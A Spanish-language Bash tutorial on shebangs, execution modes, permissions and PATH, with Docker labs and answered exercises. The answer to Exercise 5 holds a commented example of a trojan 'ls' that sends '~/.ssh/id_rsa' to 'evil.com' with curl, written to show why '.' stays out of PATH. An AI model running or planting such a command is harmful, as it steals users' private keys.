# T01 — Shebang y ejecución

## Errata y mejoras sobre el material base

1. **`PATH yscripts`** → `PATH y scripts` (espacio faltante en título).

2. **Ejercicio 7: `head -1 /bin/ls`, `head -1 /usr/bin/grep`** — Esos son
   binarios compilados (ELF), no scripts. No tienen shebang; `head -1`
   muestra basura binaria. Corregido para usar scripts reales del sistema
   (ej: archivos en `/etc/cron.daily/`, `/etc/init.d/`).

3. **Ejercicio 10: script sin shebang ejecutado con `bash`** — El ejercicio
   dice que fallará, pero `bash /tmp/script` funciona perfectamente porque
   bash sabe interpretar arrays. El error solo ocurre con `./script` si el
   kernel elige dash. Corregido para mostrar ambos casos.

---

## Qué es el shebang

El **shebang** (también hashbang) es la primera línea de un script que indica
al kernel qué intérprete debe usarse para ejecutarlo:

```bash
#!/bin/bash
echo "Hola desde bash"
```

```
#!  → "magic number" que el kernel reconoce (bytes 0x23 0x21)
/bin/bash → ruta al intérprete

Cuando ejecutas: ./script.sh
El kernel lee los primeros bytes, ve #! y ejecuta:
  /bin/bash ./script.sh
```

Sin shebang, el comportamiento depende del sistema: algunos shells intentan
interpretarlo con `/bin/sh`, otros fallan. El shebang es la forma correcta
y explícita de declarar el intérprete.

---

## #!/bin/bash vs #!/usr/bin/env bash

### Ruta absoluta

```bash
#!/bin/bash
```

- **Ventaja:** directo, sin ambigüedad, no depende de `PATH`.
- **Problema:** asume que bash está en `/bin/bash`. En FreeBSD, NixOS o
  contenedores mínimos, bash puede estar en otro lugar.

### env lookup

```bash
#!/usr/bin/env bash
```

`env` busca `bash` en el `PATH` del usuario y ejecuta el primero que
encuentra:

```
#!/usr/bin/env bash
  → env busca bash en PATH
  → Encuentra /bin/bash (o /usr/local/bin/bash, o donde esté)
  → Ejecuta ese bash con el script
```

- **Ventaja:** funciona sin importar dónde esté instalado bash.
- **Desventaja:** depende de `PATH` (un atacante podría anteponer un bash falso).

### Cuándo usar cada uno

| Situación | Shebang recomendado |
|---|---|
| Scripts de sistema (init, cron root) | `#!/bin/bash` (ruta fija, seguro) |
| Scripts portables (múltiples distros) | `#!/usr/bin/env bash` |
| Scripts de Python | `#!/usr/bin/env python3` |
| Scripts POSIX (máxima compatibilidad) | `#!/bin/sh` |

---

## sh vs bash

```bash
#!/bin/sh
# sh es POSIX shell — funcionalidad mínima garantizada
# En Debian/Ubuntu: sh → dash (NO es bash)
# En RHEL/CentOS:   sh → bash

ls -la /bin/sh
# Debian: lrwxrwxrwx 1 root root 4 ... /bin/sh -> dash
# RHEL:   lrwxrwxrwx 1 root root 4 ... /bin/sh -> bash
```

| Distribución | `/bin/sh` apunta a | Notas |
|---|---|---|
| Debian/Ubuntu | dash | POSIX estricto, más rápido, menos funciones |
| RHEL/CentOS/Fedora | bash | bash en modo POSIX |
| Alpine | busybox ash | Contenedores mínimos |
| Arch | bash | |

### Bashismos que fallan en dash

Si usas `#!/bin/sh` en Debian, estos fallan porque dash no los soporta:

```bash
# Estas features son exclusivas de bash:
[[ "$var" == "test" ]]     # → usar [ "$var" = "test" ]
arr=(uno dos tres)         # → arrays no existen en POSIX sh
${var//pat/rep}            # → sustitución de patrones
${var,,}                   # → conversión a minúsculas
(( x + 1 ))               # → usar $(( x + 1 )) o [ $x -eq 1 ]
<<<                        # → here-strings no existen
select                     # → no existe en POSIX sh
```

**Regla:** si usas cualquier feature de bash (y lo harás), usar `#!/bin/bash`
o `#!/usr/bin/env bash`. Usar `#!/bin/sh` solo para scripts POSIX puros.

---

## Permisos de ejecución

Un script necesita el bit de ejecución (`x`) para ejecutarse directamente:

```bash
# Crear un script
cat > script.sh << 'EOF'
#!/bin/bash
echo "Funciona"
EOF

# Sin permiso de ejecución:
./script.sh
# bash: ./script.sh: Permission denied

# Dar permiso de ejecución
chmod +x script.sh

# Ahora funciona
./script.sh
# Funciona

# Alternativa: ejecutar con el intérprete (no necesita +x)
bash script.sh
# Funciona (no necesita chmod +x)
```

### Permisos típicos para scripts

| Permiso | Octal | rwx | Uso |
|---|---|---|---|
| Público | `755` | `rwxr-xr-x` | Scripts de uso general |
| Solo owner | `700` | `rwx------` | Scripts con datos sensibles |
| Owner + grupo | `750` | `rwxr-x---` | Scripts compartidos en grupo |

---

## Ejecución: ./script vs bash script vs source

### ./script.sh — Subshell

```bash
./script.sh
# 1. El kernel lee el shebang (#!)
# 2. Crea un nuevo proceso (fork + exec)
# 3. El script ejecuta en un SUBSHELL (proceso hijo)
# 4. Las variables y cambios de directorio NO afectan al shell padre

cat > test.sh << 'EOF'
#!/bin/bash
MY_VAR="desde el script"
cd /tmp
EOF
chmod +x test.sh

./test.sh
echo $MY_VAR    # (vacío — la variable murió con el subshell)
pwd              # (sigue en el directorio original)
```

### source script.sh (o . script.sh)

```bash
source script.sh
# o equivalente POSIX:
. script.sh

# Ejecuta el script en el shell ACTUAL (no crea subshell)
# Las variables y cambios de directorio PERSISTEN

source test.sh
echo $MY_VAR    # "desde el script"
pwd              # /tmp (el cd afectó al shell actual)
```

`source` se usa para:
- Cargar configuración: `source ~/.bashrc`
- Cargar funciones de librería: `source /usr/lib/mi-lib.sh`
- Activar entornos: `source venv/bin/activate`
- Cargar variables: `. .env`

### bash script.sh — Forzar intérprete

```bash
bash script.sh
# Ejecuta el script con bash explícitamente
# No necesita permiso de ejecución (+x)
# No necesita shebang (se ignora si existe)
# Crea un subshell (como ./)
# Útil para pruebas rápidas y debugging
```

### Resumen comparativo

| Forma | Subshell | Necesita +x | Usa shebang | Variables persisten |
|---|---|---|---|---|
| `./script.sh` | Sí | Sí | Sí | No |
| `bash script.sh` | Sí | No | No (se ignora) | No |
| `source script.sh` | No | No | No (se ignora) | Sí |
| `. script.sh` | No | No | No (se ignora) | Sí |

---

## PATH y localización de scripts

Cuando ejecutas un comando sin ruta (`script.sh` en lugar de `./script.sh`),
el shell lo busca en los directorios listados en `PATH`:

```bash
echo $PATH
# /usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin

# El shell busca en orden:
# 1. /usr/local/bin/script.sh
# 2. /usr/bin/script.sh
# 3. /bin/script.sh
# 4. ... no encontrado → "command not found"
```

### Por qué ./script.sh y no script.sh

```bash
# El directorio actual (.) NO está en PATH por defecto
# (por seguridad — evita que un atacante ponga un "ls" malicioso
# en un directorio y tú lo ejecutes sin querer)

script.sh
# bash: script.sh: command not found

./script.sh
# Funciona — ./ indica explícitamente "en el directorio actual"

# NUNCA agregar . al PATH:
# export PATH=".:$PATH"    ← PELIGROSO
```

### Hacer un script accesible globalmente

```bash
# Opción 1: copiar a un directorio en PATH
sudo cp script.sh /usr/local/bin/script
sudo chmod 755 /usr/local/bin/script

# Opción 2: agregar tu directorio al PATH
mkdir -p ~/bin
cp script.sh ~/bin/
echo 'export PATH="$HOME/bin:$PATH"' >> ~/.bashrc
source ~/.bashrc

# Opción 3: symlink
sudo ln -s /ruta/absoluta/script.sh /usr/local/bin/script
```

---

## Shebang con opciones

```bash
#!/bin/bash -e
# Equivale a: bash -e script.sh
# -e = salir si cualquier comando falla (set -e)

#!/bin/bash -eu
# -e = salir si falla un comando
# -u = error si se usa una variable no definida

#!/usr/bin/env -S bash -eu
# Con env, las opciones se pasan con -S (split string)
# Requiere GNU coreutils 8.30+ (no todos los sistemas lo soportan)
```

**En la práctica**, es más claro y portable poner las opciones dentro del script:

```bash
#!/usr/bin/env bash
set -euo pipefail
# -e: salir si un comando falla
# -u: error en variables no definidas
# -o pipefail: falla si cualquier comando en un pipe falla
```

---

## Shebangs para otros lenguajes

```bash
#!/usr/bin/env python3
#!/usr/bin/env perl
#!/usr/bin/env ruby
#!/usr/bin/env node
#!/usr/bin/awk -f
#!/usr/bin/sed -f
```

El shebang es una feature del kernel de Linux, no de bash. Funciona con
cualquier intérprete que acepte el nombre del script como argumento.

---

## Labs

### Lab 1 — El shebang en acción

```bash
docker compose exec debian-dev bash -c '
echo "=== Qué es el shebang ==="
echo ""
echo "La primera línea #! indica al kernel qué intérprete usar"
echo ""
echo "--- Crear script con shebang bash ---"
cat > /tmp/hello.sh << '\''SCRIPT'\''
#!/bin/bash
echo "Intérprete: $BASH_VERSION"
echo "Shell: $0"
echo "PID: $$"
SCRIPT
chmod +x /tmp/hello.sh
echo ""
cat /tmp/hello.sh
echo ""
echo "--- Ejecutar ---"
/tmp/hello.sh
'
```

```bash
docker compose exec debian-dev bash -c '
echo "=== sh en Debian = dash ==="
echo ""
ls -la /bin/sh
echo ""
echo "En Debian, /bin/sh → dash (POSIX mínimo, no bash)"
echo ""
echo "--- Script con bashismo bajo #!/bin/sh ---"
cat > /tmp/bashism.sh << '\''SCRIPT'\''
#!/bin/sh
NAME="test"
if [[ "$NAME" == "test" ]]; then
    echo "Funciona"
fi
SCRIPT
chmod +x /tmp/bashism.sh
echo ""
echo "--- Ejecutar (falla en dash) ---"
/tmp/bashism.sh 2>&1 || true
echo ""
echo "[[ ]] no existe en dash (POSIX sh)"
echo "Bashismos que fallan: [[ ]], arrays, \${var//}, <<<, select"
'
```

```bash
docker compose exec debian-dev bash -c '
echo "=== #!/bin/bash vs #!/usr/bin/env bash ==="
echo ""
echo "#!/bin/bash      → ruta fija, seguro, puede no ser portable"
echo "#!/usr/bin/env bash → busca en PATH, portable, depende de PATH"
echo ""
echo "--- Dónde está bash ---"
which bash
echo ""
echo "--- Dónde está env ---"
which env
echo ""
echo "Recomendación:"
echo "  Scripts de usuario: #!/usr/bin/env bash (portabilidad)"
echo "  Scripts de sistema: #!/bin/bash (seguridad, no depende de PATH)"
'
```

### Lab 2 — Formas de ejecución

```bash
docker compose exec debian-dev bash -c '
echo "=== chmod +x y ejecución directa ==="
echo ""
cat > /tmp/no-exec.sh << '\''SCRIPT'\''
#!/bin/bash
echo "Ejecutado correctamente"
SCRIPT
echo "--- Permisos sin +x ---"
ls -l /tmp/no-exec.sh
echo ""
echo "--- Intentar ejecutar sin +x ---"
/tmp/no-exec.sh 2>&1 || true
echo ""
chmod +x /tmp/no-exec.sh
echo "--- Después de chmod +x ---"
ls -l /tmp/no-exec.sh
/tmp/no-exec.sh
'
```

```bash
docker compose exec debian-dev bash -c '
echo "=== source vs ./script (subshell) ==="
echo ""
cat > /tmp/change-env.sh << '\''SCRIPT'\''
#!/bin/bash
export LAB_VAR="desde_el_script"
cd /tmp
echo "Dentro del script: PWD=$PWD LAB_VAR=$LAB_VAR"
SCRIPT
chmod +x /tmp/change-env.sh

echo "=== Ejecutar con ./ (subshell) ==="
unset LAB_VAR 2>/dev/null || true
cd /root
echo "Antes: PWD=$PWD LAB_VAR=${LAB_VAR:-no_definida}"
/tmp/change-env.sh
echo "Después: PWD=$PWD LAB_VAR=${LAB_VAR:-no_definida}"
echo "→ El subshell cambió cd y export, pero el shell actual NO cambió"
echo ""
echo "=== Ejecutar con source (mismo shell) ==="
unset LAB_VAR 2>/dev/null || true
cd /root
echo "Antes: PWD=$PWD LAB_VAR=${LAB_VAR:-no_definida}"
source /tmp/change-env.sh
echo "Después: PWD=$PWD LAB_VAR=${LAB_VAR:-no_definida}"
echo "→ source ejecuta en el MISMO shell: cd y export persisten"
'
```

### Lab 3 — PATH y seguridad

```bash
docker compose exec debian-dev bash -c '
echo "=== Por qué ./script.sh y no script.sh ==="
echo ""
cat > /tmp/test-path.sh << '\''SCRIPT'\''
#!/bin/bash
echo "Ejecutado"
SCRIPT
chmod +x /tmp/test-path.sh
cd /tmp
test-path.sh 2>&1 || true
echo ""
echo "El shell busca en PATH, no en el directorio actual"
echo ". NO está en PATH (por seguridad)"
echo ""
echo "$PATH" | tr ":" "\n" | grep "^\.$" || echo "\".\" NO está en PATH (correcto)"
echo ""
echo "--- Shebangs en scripts reales del sistema ---"
for f in /etc/cron.daily/*; do
    [ -f "$f" ] && printf "%-30s %s\n" "$(basename $f)" "$(head -1 $f)" 2>/dev/null
done | head -5
echo ""
echo "--- Intérpretes disponibles ---"
for cmd in bash sh dash python3 perl; do
    path=$(which "$cmd" 2>/dev/null || echo "no encontrado")
    printf "%-12s %s\n" "$cmd" "$path"
done
'
```

### Limpieza

```bash
docker compose exec debian-dev bash -c '
rm -f /tmp/hello.sh /tmp/bashism.sh /tmp/no-exec.sh
rm -f /tmp/change-env.sh /tmp/test-path.sh /tmp/test-sh.sh
echo "Archivos temporales eliminados"
'
```

---

## Ejercicios

### Ejercicio 1 — El shebang como magic number

Crea un script con `#!/bin/bash` y ejecútalo con `./`. ¿Qué pasa si
borras el shebang y ejecutas con `./`? ¿Y con `bash script.sh`? ¿Por
qué la diferencia?

<details><summary>Predicción</summary>

```bash
cat > /tmp/test.sh << 'EOF'
#!/bin/bash
echo "PID: $$ — BASH_VERSION: $BASH_VERSION"
EOF
chmod +x /tmp/test.sh

# Con shebang:
./tmp/test.sh    # Funciona: kernel lee #!, ejecuta /bin/bash

# Sin shebang (borrar primera línea):
# ./tmp/test.sh → depende del sistema:
#   - Algunos shells asumen /bin/sh (puede ser dash)
#   - Puede fallar con "cannot execute binary file"
#   - Comportamiento NO garantizado

# Con bash explícito:
bash /tmp/test.sh    # Siempre funciona: bash interpreta directamente
```

La diferencia: `./` delega al kernel (que usa el shebang). `bash script.sh`
no necesita shebang porque el usuario ya eligió el intérprete explícitamente.

</details>

### Ejercicio 2 — sh vs bash en Debian

Crea un script con `#!/bin/sh` que use arrays y `[[ ]]`. ¿Funciona en
Debian? ¿Y en RHEL? ¿Por qué? ¿Cómo lo arreglas?

<details><summary>Predicción</summary>

```bash
cat > /tmp/test-sh.sh << 'EOF'
#!/bin/sh
arr=(uno dos tres)
if [[ "${arr[0]}" == "uno" ]]; then
    echo "Funciona"
fi
EOF
chmod +x /tmp/test-sh.sh
```

En **Debian**: falla. `/bin/sh` → dash, que no soporta arrays ni `[[ ]]`.
```
/tmp/test-sh.sh: 2: Syntax error: "(" unexpected
```

En **RHEL**: funciona. `/bin/sh` → bash, que soporta todo.

**Arreglo:** cambiar `#!/bin/sh` a `#!/bin/bash`. Esto garantiza bash
en ambas distribuciones. Alternativa POSIX pura (sin bashismos):
```bash
#!/bin/sh
val="uno"
if [ "$val" = "uno" ]; then
    echo "Funciona"
fi
```

</details>

### Ejercicio 3 — source vs subshell

Crea un script que defina una variable y haga `cd /tmp`. Ejecútalo con
`./`, `bash`, y `source`. ¿En cuál persiste la variable? ¿En cuál
cambia el directorio actual?

<details><summary>Predicción</summary>

```bash
cat > /tmp/env-test.sh << 'EOF'
#!/bin/bash
export MY_VAR="hello"
cd /tmp
EOF
chmod +x /tmp/env-test.sh

# Antes de cada ejecución: estás en ~, MY_VAR no existe

# ./env-test.sh (subshell):
echo $MY_VAR    # (vacío)
pwd              # ~ (no cambió)

# bash /tmp/env-test.sh (subshell):
echo $MY_VAR    # (vacío)
pwd              # ~ (no cambió)

# source /tmp/env-test.sh (mismo shell):
echo $MY_VAR    # "hello" ← persiste
pwd              # /tmp   ← cambió
```

`./` y `bash` crean un proceso hijo (subshell). Cuando el hijo muere,
sus variables y `cd` mueren con él. `source` ejecuta en el shell actual,
así que todo persiste.

</details>

### Ejercicio 4 — Permisos de ejecución

¿Por qué `./script.sh` necesita `chmod +x` pero `bash script.sh` no?
¿Qué syscall usa el kernel para verificar los permisos?

<details><summary>Predicción</summary>

```bash
# Sin +x:
./script.sh       # → Permission denied
bash script.sh    # → Funciona

# ¿Por qué?
# ./script.sh:
#   El kernel ejecuta execve("./script.sh", ...)
#   execve() verifica el bit de ejecución del archivo
#   Si no tiene +x → retorna EACCES (Permission denied)

# bash script.sh:
#   El kernel ejecuta execve("/bin/bash", ["bash", "script.sh"])
#   bash tiene +x (es un binario del sistema)
#   bash ABRE script.sh como archivo de texto (solo necesita lectura)
#   No se ejecuta script.sh directamente → no necesita +x
```

La diferencia es quién ejecuta qué:
- `./script.sh`: el kernel ejecuta el script → necesita +x
- `bash script.sh`: el kernel ejecuta bash → bash lee el script como texto

</details>

### Ejercicio 5 — PATH y seguridad

¿Por qué `.` no está en `PATH` por defecto? Describe un ataque que
sería posible si `.` estuviera en `PATH`.

<details><summary>Predicción</summary>

```bash
# Verificar que . no está en PATH
echo $PATH | tr ":" "\n" | grep "^\.$"
# (sin output — correcto)

# Ataque si . estuviera en PATH:
# 1. Atacante pone un archivo "ls" malicioso en /tmp:
#    cat > /tmp/ls << 'EOF'
#    #!/bin/bash
#    # Enviar datos al atacante
#    curl http://evil.com/steal?data=$(cat ~/.ssh/id_rsa | base64)
#    # Luego ejecutar el ls real para no levantar sospechas
#    /bin/ls "$@"
#    EOF
#    chmod +x /tmp/ls

# 2. Un usuario hace cd /tmp && ls
# 3. Si . está en PATH, el shell encuentra /tmp/ls ANTES de /bin/ls
# 4. Ejecuta el ls malicioso que roba la clave SSH

# Con . fuera de PATH:
# ls → busca en /usr/local/bin, /usr/bin, /bin → encuentra /bin/ls
# /tmp/ls nunca se ejecuta
```

</details>

### Ejercicio 6 — env -S y opciones en el shebang

Compara poner `-eu` en el shebang (`#!/bin/bash -eu`) vs dentro del
script (`set -eu`). ¿Cuál es más portable? ¿Qué pasa con
`#!/usr/bin/env bash -eu`?

<details><summary>Predicción</summary>

```bash
# Opción 1: en el shebang
#!/bin/bash -eu
# Funciona en Linux. El kernel pasa -eu a bash.

# Opción 2: dentro del script
#!/usr/bin/env bash
set -euo pipefail
# Más portable: funciona en cualquier sistema.

# Opción 3: env con opciones
#!/usr/bin/env -S bash -eu
# Requiere GNU coreutils 8.30+ (env -S para split string)
# NO funciona en macOS/BSD por defecto
# NO funciona en sistemas con coreutils antiguo

# Sin -S:
#!/usr/bin/env bash -eu
# env intenta buscar "bash -eu" como nombre de programa (con espacio)
# FALLA: /usr/bin/env: 'bash -eu': No such file or directory
```

**Recomendación:** siempre usar `set -euo pipefail` dentro del script.
Es la forma más portable y clara.

</details>

### Ejercicio 7 — Shebangs en el sistema real

Examina los shebangs de scripts reales en `/etc/cron.daily/` y
`/etc/init.d/`. ¿Cuáles usan `#!/bin/sh`? ¿Cuáles `#!/bin/bash`?
¿Usan bashismos los que tienen `#!/bin/sh`?

<details><summary>Predicción</summary>

```bash
# Ver shebangs de scripts de cron
for f in /etc/cron.daily/*; do
    [ -f "$f" ] && echo "$(head -1 "$f")  ← $(basename "$f")"
done

# Típicamente:
# #!/bin/sh  ← man-db, dpkg, apt-compat
# #!/bin/bash ← algunos scripts que necesitan bashismos

# Los scripts con #!/bin/sh en Debian DEBEN ser POSIX puros
# (Debian Policy lo exige: si usas #!/bin/sh, no uses bashismos)
# Usan [ ] en vez de [[ ]], no usan arrays, no usan <<<

# Scripts de init.d (si existen — systemd los reemplazó):
head -1 /etc/init.d/* 2>/dev/null | grep "#!" | head -5
# Típicamente #!/bin/sh (LSB estándar)
```

Debian tiene una política estricta: si el shebang es `#!/bin/sh`, el
script no puede usar bashismos. `checkbashisms` es una herramienta que
verifica esto.

</details>

### Ejercicio 8 — Script portable con env

Crea un script que funcione en Debian, RHEL y macOS. ¿Qué shebang
usas? ¿Cómo verificas la versión de bash dentro del script?

<details><summary>Predicción</summary>

```bash
cat > portable.sh << 'EOF'
#!/usr/bin/env bash
set -euo pipefail

echo "Bash: $(which bash)"
echo "Versión: $BASH_VERSION"
echo "OS: $(uname -s)"
echo "Distro: $(cat /etc/os-release 2>/dev/null | grep ^ID= || echo "desconocida")"

# Verificar versión mínima de bash (ej: 4.0+)
if (( BASH_VERSINFO[0] < 4 )); then
    echo "ADVERTENCIA: bash < 4.0, algunas features no disponibles"
    echo "(macOS viene con bash 3.2 por defecto)"
fi
EOF
chmod +x portable.sh
```

`#!/usr/bin/env bash` es la mejor opción para portabilidad:
- Debian: encuentra `/bin/bash` (v5.2)
- RHEL: encuentra `/bin/bash` (v5.1)
- macOS: si el usuario instaló bash via Homebrew, encuentra `/usr/local/bin/bash` (v5.x)
  en lugar de `/bin/bash` (v3.2 del sistema)

</details>

### Ejercicio 9 — Subshell y herencia

¿Qué variables hereda un subshell de su padre? ¿Cuál es la diferencia
entre `VAR=x` y `export VAR=x` respecto a los subshells?

<details><summary>Predicción</summary>

```bash
# Variable local (sin export):
VAR_LOCAL="local"
bash -c 'echo "Local: $VAR_LOCAL"'    # (vacío — no se hereda)

# Variable exportada:
export VAR_EXPORT="exportada"
bash -c 'echo "Export: $VAR_EXPORT"'   # "exportada" — sí se hereda

# Funciones (solo si se exportan):
mi_func() { echo "hola"; }
bash -c 'mi_func' 2>&1 || true        # falla — no se hereda
export -f mi_func
bash -c 'mi_func'                      # "hola" — se hereda
```

Reglas de herencia padre → hijo (subshell):
- Variables `export`: sí se heredan
- Variables sin `export`: no se heredan
- Funciones: solo con `export -f`
- `cd` (directorio actual): el hijo hereda el cwd del padre al momento del fork
- Aliases: no se heredan

`source` no tiene esta limitación porque no hay hijo — todo ejecuta
en el mismo proceso.

</details>

### Ejercicio 10 — Diagnóstico de problemas de shebang

Dado un script que falla, ¿cómo diagnosticas si el problema es el
shebang? Lista 4 herramientas/técnicas de diagnóstico.

<details><summary>Predicción</summary>

```bash
# 1. Ver el shebang
head -1 script.sh
# ¿Existe? ¿Es la ruta correcta? ¿Tiene caracteres invisibles?

# 2. Verificar que el intérprete existe
file $(head -1 script.sh | sed 's/^#!//')
# ¿Es un archivo ejecutable? ¿Existe la ruta?

# 3. Verificar caracteres invisibles (BOM, \r)
hexdump -C script.sh | head -1
# Correcto: 23 21 2f 62 69 6e ... (#!/bin...)
# BOM:      ef bb bf 23 21 ...    (UTF-8 BOM antes del #!)
# \r:       ...0d 0a              (retorno de carro de Windows)

# 4. Ejecutar con intérprete explícito para aislar
bash -x script.sh    # -x muestra cada comando antes de ejecutar
# Si funciona con bash pero no con ./ → problema de shebang o permisos

# Problemas comunes:
# - BOM de UTF-8 antes del #! → el kernel no reconoce el magic number
# - \r\n (Windows) → /bin/bash\r no existe
# - Espacio después de #! → #!/ bin/bash (ruta incorrecta)
# - Shebang en segunda línea → debe ser la PRIMERA línea
```

Para arreglar archivos con \r\n de Windows: `sed -i 's/\r$//' script.sh`
o `dos2unix script.sh`.

</details>
